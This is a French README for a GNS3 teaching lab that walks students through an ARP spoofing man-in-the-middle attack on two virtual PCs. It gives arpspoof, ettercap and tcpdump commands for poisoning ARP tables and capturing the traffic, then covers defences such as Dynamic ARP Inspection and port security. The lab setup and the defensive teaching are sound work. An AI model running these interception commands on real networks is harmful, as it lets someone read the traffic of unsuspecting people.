# Lab 22: ARP Spoofing - Man-in-the-Middle Attack

Ce lab démontre une attaque **ARP Spoofing** dans un environnement GNS3 contrôlé. Un attaquant (Kali Linux) manipule les tables ARP de deux victimes (VPCs) pour intercepter leur trafic.

## Table des matières

1. [Objectifs](#objectifs)
2. [Prérequis](#prérequis)
3. [Architecture](#architecture)
4. [Démarrage rapide](#démarrage-rapide)
5. [Exercice pas à pas](#exercice-pas-à-pas)
6. [Commandes de référence](#commandes-de-référence)
7. [Résultats attendus](#résultats-attendus)
8. [Rapport à soumettre](#rapport-à-soumettre)
9. [Troubleshooting](#troubleshooting)

---

## Objectifs

- Comprendre le fonctionnement du protocole ARP et ses vulnérabilités
- Réaliser une attaque **ARP Spoofing** avec des outils comme `arpspoof` ou `ettercap`
- Observer la modification des tables ARP des victimes
- Comprendre le concept d'attaque **Man-in-the-Middle (MitM)**

---

## Prérequis

- **GNS3** connecté au serveur distant
- **Ansible** installé (`brew install ansible`)
- **Python 3**

---

## Architecture

```
22_ARP_Spoofing/
├── ansible.cfg
├── inventory.yml
├── group_vars/all.yml
├── README.md
├── RAPPORT.md                # Rapport d'exercice avec screenshots
├── switch_info.yml           # Généré automatiquement
├── assets/                   # Screenshots du lab
│   ├── gns3.png
│   ├── kali.png
│   ├── results.png
│   ├── VPC1.png
│   └── VPC2.png
├── playbooks/
│   ├── 00_full_lab.yml       # Déploiement complet
│   ├── 01_create_topology.yml
│   ├── 02_configure_vpcs.yml
│   └── 03_add_kali.yml       # Ajoute Kali + NAT
└── scripts/
    └── cisco_cli.py
```

### Topologie

```
                      ┌───────┐
                      │  NAT  │ ← Accès Internet
                      └───┬───┘
                          │ eth1
     ┌─────────────────┐  │
     │  KALI-ATTACKER  ├──┘
     │  192.168.10.100 │     ettercap, arpspoof, tcpdump...
     └────────┬────────┘
              │ eth0 (e0/1)
       ┌──────┴──────┐
       │     SW1     │  ← Switch Layer 2 (IOU L2)
       │  (default)  │     VLAN 1 (défaut)
       └──────┬──────┘
         e0/2 │ e0/3
    ┌─────────┴─────────┐
    │                   │
 ┌──┴───┐           ┌───┴──┐
 │ VPC1 │           │ VPC2 │
 │.10.10│           │.10.20│
 └──────┘           └──────┘
  Victime 1         Victime 2
```

| Device | IP | Type | Rôle |
|--------|-----|------|------|
| KALI-ATTACKER | 192.168.10.100 (eth0) | Docker Kali | Attaquant |
| NAT | DHCP (eth1) | NAT | Accès Internet |
| VPC1 | 192.168.10.10 | VPCS | Victime 1 |
| VPC2 | 192.168.10.20 | VPCS | Victime 2 |
| SW1 | - | IOU L2 | Switch Layer 2 |

---

## Démarrage rapide

```bash
cd 22_ARP_Spoofing

# Option 1: Déploiement complet en une commande
ansible-playbook playbooks/00_full_lab.yml

# Option 2: Étape par étape
ansible-playbook playbooks/01_create_topology.yml   # Créer switch + VPCs
ansible-playbook playbooks/02_configure_vpcs.yml    # Configurer les IPs
ansible-playbook playbooks/03_add_kali.yml          # Ajouter Kali + NAT
```

**Note**: Les playbooks sont **idempotents** - vous pouvez les relancer sans erreur.

---

## Exercice pas à pas

### Étape 1: Déployer le lab

```bash
ansible-playbook playbooks/00_full_lab.yml
```

### Étape 2: Vérifier la connectivité initiale

**Sur VPC1:**
```bash
telnet <IP_GNS3_SERVER> <PORT_VPC1>

# Vérifier l'IP
VPC1> show ip

# Ping VPC2
VPC1> ping 192.168.10.20

# Voir la table ARP (AVANT l'attaque)
VPC1> show arp
```

**Sur VPC2:**
```bash
telnet <IP_GNS3_SERVER> <PORT_VPC2>

# Vérifier l'IP
VPC2> show ip

# Ping VPC1
VPC2> ping 192.168.10.10

# Voir la table ARP (AVANT l'attaque)
VPC2> show arp
```

**Résultat attendu:** Les tables ARP contiennent les vraies adresses MAC.

### Étape 3: Se connecter à Kali

```bash
telnet <IP_GNS3_SERVER> <PORT_KALI>

# Login: root (mot de passe: toor ou vide)
```

### Étape 4: Redémarrer Kali et installer les outils

Le playbook configure automatiquement `/etc/network/interfaces` et `/etc/resolv.conf`, mais il faut **redémarrer Kali** pour appliquer la configuration.

**Dans GNS3 GUI:**
1. Clic droit sur KALI-ATTACKER → **Stop**
2. Clic droit sur KALI-ATTACKER → **Start**

**Puis sur Kali:**
```bash
# Se connecter
telnet <IP_GNS3_SERVER> <PORT_KALI>
# Login: root (mot de passe vide ou toor)

# Vérifier la connexion Internet
ping -c 2 8.8.8.8

# Installer les outils d'attaque
apt update && apt install -y dsniff ettercap-text-only tcpdump

# Tester la connectivité avec les VPCs
ping -c 2 192.168.10.10
ping -c 2 192.168.10.20
```

### Étape 5: Capturer la table ARP AVANT l'attaque

**Sur Kali:**
```bash
arp -a
```

**Sur VPC1 et VPC2:**
```
> show arp
```

**Screenshot #1:** Tables ARP avant l'attaque

### Étape 6: Lancer l'attaque ARP Spoofing

```bash
# IMPORTANT: Activer le forwarding IP (sinon le trafic sera bloqué)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Vérifier
cat /proc/sys/net/ipv4/ip_forward
# Doit afficher: 1
```

**Option A: Avec arpspoof (simple)**
```bash
arpspoof -i eth0 -t 192.168.10.10 -r 192.168.10.20
```
- `-i eth0` : Interface réseau
- `-t 192.168.10.10` : Target (VPC1)
- `-r` : Bidirectionnel (empoisonne aussi 192.168.10.20)

**Option B: Avec ettercap (plus complet)**
```bash
ettercap -T -M arp:remote /192.168.10.10// /192.168.10.20//
```
- `-T` : Mode texte
- `-M arp:remote` : Mode Man-in-the-Middle ARP
- `/IP//` : Format cible (IP/MAC/PORT)

**Screenshot #2:** Commande d'attaque en cours

### Étape 7: Vérifier les tables ARP APRÈS l'attaque

**Pendant que l'attaque tourne**, vérifiez les tables ARP sur les VPCs:

**Sur VPC1:**
```
VPC1> show arp
```

**Sur VPC2:**
```
VPC2> show arp
```

**Résultat attendu:**
- L'entrée ARP pour `192.168.10.20` sur VPC1 devrait maintenant avoir la **MAC de Kali**
- L'entrée ARP pour `192.168.10.10` sur VPC2 devrait maintenant avoir la **MAC de Kali**

**Screenshot #3:** Tables ARP après l'attaque (montrant les MAC modifiées)

### Étape 8: Sniffer le trafic intercepté (bonus)

```bash
# Sur Kali, dans un autre terminal
tcpdump -i eth0 -n host 192.168.10.10 or host 192.168.10.20
```

Pendant ce temps, générez du trafic entre VPC1 et VPC2:
```
VPC1> ping 192.168.10.20
```

Vous devriez voir les paquets ICMP passer par Kali.

**Screenshot #4:** Trafic capturé sur Kali

### Étape 9: Arrêter l'attaque

- Appuyez sur `Ctrl+C` pour arrêter arpspoof ou ettercap
- Les tables ARP reviendront à la normale après expiration du cache (ou forcer avec un ping)

---

## Commandes de référence

### Commandes Kali

| Commande | Description |
|----------|-------------|
| `ip addr show eth0` | Voir l'IP et MAC |
| `arp -a` | Voir la table ARP |
| `echo 1 > /proc/sys/net/ipv4/ip_forward` | Activer IP forwarding |
| `arpspoof -i eth0 -t TARGET -r GATEWAY` | ARP Spoofing bidirectionnel |
| `ettercap -T -M arp:remote /IP1// /IP2//` | ARP MitM avec ettercap |
| `tcpdump -i eth0 -n` | Sniffer le trafic |

### Commandes VPCS

| Commande | Description |
|----------|-------------|
| `show ip` | Voir la configuration IP |
| `show arp` | Voir la table ARP |
| `ping <IP>` | Tester la connectivité |
| `clear arp` | Vider la table ARP |

### Accès console

```bash
# Les ports sont affichés dans switch_info.yml
cat switch_info.yml

# Connexion
telnet <IP_GNS3_SERVER> <PORT>
```

---

## Résultats attendus

### Avant l'attaque

```
VPC1> show arp
192.168.10.20  00:50:79:xx:xx:xx  (vraie MAC de VPC2)

VPC2> show arp
192.168.10.10  00:50:79:yy:yy:yy  (vraie MAC de VPC1)
```

### Après l'attaque

```
VPC1> show arp
192.168.10.20  aa:bb:cc:dd:ee:ff  (MAC de KALI!)

VPC2> show arp
192.168.10.10  aa:bb:cc:dd:ee:ff  (MAC de KALI!)
```

Le trafic entre VPC1 et VPC2 passe maintenant par Kali.

---

## Rapport à soumettre

Votre rapport doit inclure:

### 1. Description des étapes
- Comment vous avez déployé le lab
- Comment vous avez configuré Kali
- Quelle commande d'attaque vous avez utilisée

### 2. Captures d'écran

| # | Description |
|---|-------------|
| 1 | Tables ARP des VPCs **AVANT** l'attaque |
| 2 | Commande d'attaque en cours sur Kali |
| 3 | Tables ARP des VPCs **APRÈS** l'attaque (montrant les MAC modifiées) |
| 4 | (Bonus) Trafic capturé avec tcpdump |

### 3. Analyse
- Expliquer pourquoi les tables ARP ont changé
- Quel est le risque de cette attaque en entreprise?
- Comment se protéger? (Dynamic ARP Inspection, Port Security, etc.)

---

## Troubleshooting

### Les VPCs ne peuvent pas se pinguer

1. Vérifier les IPs: `show ip`
2. Vérifier que les interfaces sont connectées dans GNS3
3. Vérifier que le switch est démarré

### Kali n'a pas de connectivité

Le container Kali est minimaliste - `ip` et `ifconfig` ne sont pas installés par défaut.

1. **Redémarrer Kali** dans GNS3 (Stop → Start) pour appliquer `/etc/network/interfaces`
2. Vérifier que eth0 a l'IP `192.168.10.100` et eth1 a une IP DHCP
3. Si pas d'Internet, vérifier `/etc/resolv.conf`:
   ```bash
   cat /etc/resolv.conf
   # Doit contenir: nameserver 8.8.8.8
   ```

### Les outils ne sont pas installés

```bash
# Vérifier Internet d'abord
ping -c 2 8.8.8.8

# Installer les outils
apt update && apt install -y dsniff ettercap-text-only tcpdump
```

### L'attaque ne fonctionne pas

1. Vérifier que IP forwarding est activé:
   ```bash
   cat /proc/sys/net/ipv4/ip_forward
   # Doit afficher: 1
   ```

2. Vérifier que vous êtes sur la bonne interface (`eth0`)

3. **Vider le cache ARP des VPCs** (les anciennes entrées peuvent persister):
   ```
   VPC1> clear arp
   VPC1> show arp
   ```
   Après `clear arp`, les nouvelles entrées seront celles empoisonnées par ettercap/arpspoof.

4. Générer du trafic entre les VPCs pour forcer la mise à jour ARP:
   ```
   VPC1> ping 192.168.10.20
   ```

### Connexion telnet refusée

Le node n'est pas démarré. Dans GNS3 GUI → Clic droit → Start.

---

## Concepts clés

### Comment fonctionne ARP Spoofing?

```
┌─────────────────────────────────────────────────────────────────┐
│                     ATTAQUE ARP SPOOFING                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  SITUATION NORMALE:                                             │
│  VPC1 → "Qui a 192.168.10.20?" → VPC2 répond avec sa MAC        │
│                                                                 │
│  ATTAQUE:                                                       │
│  Kali envoie des ARP Reply non sollicités:                      │
│    → À VPC1: "192.168.10.20 est à <MAC_KALI>"                   │
│    → À VPC2: "192.168.10.10 est à <MAC_KALI>"                   │
│                                                                 │
│  RÉSULTAT:                                                      │
│  VPC1 → Kali → VPC2  (tout le trafic passe par Kali)            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Pourquoi ça marche?

- ARP est un protocole **sans authentification**
- Les hôtes acceptent les ARP Reply même non sollicités (**Gratuitous ARP**)
- Il n'y a pas de vérification de l'identité de l'expéditeur

### Comment se protéger?

| Protection | Description |
|------------|-------------|
| **Dynamic ARP Inspection (DAI)** | Vérifie les paquets ARP contre une base DHCP snooping |
| **Port Security** | Limite le nombre de MAC par port |
| **Static ARP** | Entrées ARP statiques (peu pratique à grande échelle) |
| **802.1X** | Authentification des postes sur le réseau |
| **Segmentation VLAN** | Limite la portée des attaques |

---

## Références

- [ARP Protocol (RFC 826)](https://datatracker.ietf.org/doc/html/rfc826)
- [Cisco Dynamic ARP Inspection](https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst6500/ios/15-0SY/configuration/guide/15_0_sy_swcg/dynamic_arp_inspection.html)
- [Ettercap Documentation](https://www.ettercap-project.org/doc.html)
- [Arpspoof (dsniff)](https://linux.die.net/man/8/arpspoof)
